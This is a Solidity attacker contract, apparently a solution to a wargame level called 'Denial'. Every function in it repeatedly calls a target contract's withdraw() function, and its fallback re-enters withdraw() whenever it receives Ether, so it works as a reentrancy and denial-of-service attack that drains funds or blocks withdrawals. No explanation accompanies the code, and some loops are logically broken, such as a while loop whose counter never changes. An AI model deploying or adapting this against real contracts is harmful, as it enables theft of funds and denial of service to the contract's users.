// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Denial {
    function withdraw() external;
}

contract ReentrancyDenial {
    
    address payable public reentrancyAddress;
    Denial public ab;


    function setAddress (address payable _addr) public {
        reentrancyAddress = _addr;
        ab = Denial(reentrancyAddress);

    }
    function calculatedAttack(uint doom) public {
        for (uint i = 0; i < doom; i++) {
        ab.withdraw();
        }
    }
    
    function whileAttack() public {
        uint random = address(reentrancyAddress).balance/100;
        while (random > 0) {
            ab.withdraw();
        }
    }

    function crazyAttack() public {
        ab.withdraw();
    }
    
    function info() public view returns (uint) {
        return address(reentrancyAddress).balance/100;
    }

    function attack() public {
        if (address(reentrancyAddress).balance/100 >= 0) {
          ab.withdraw();
        }
    }

    fallback() external payable {
        attack();
    }
}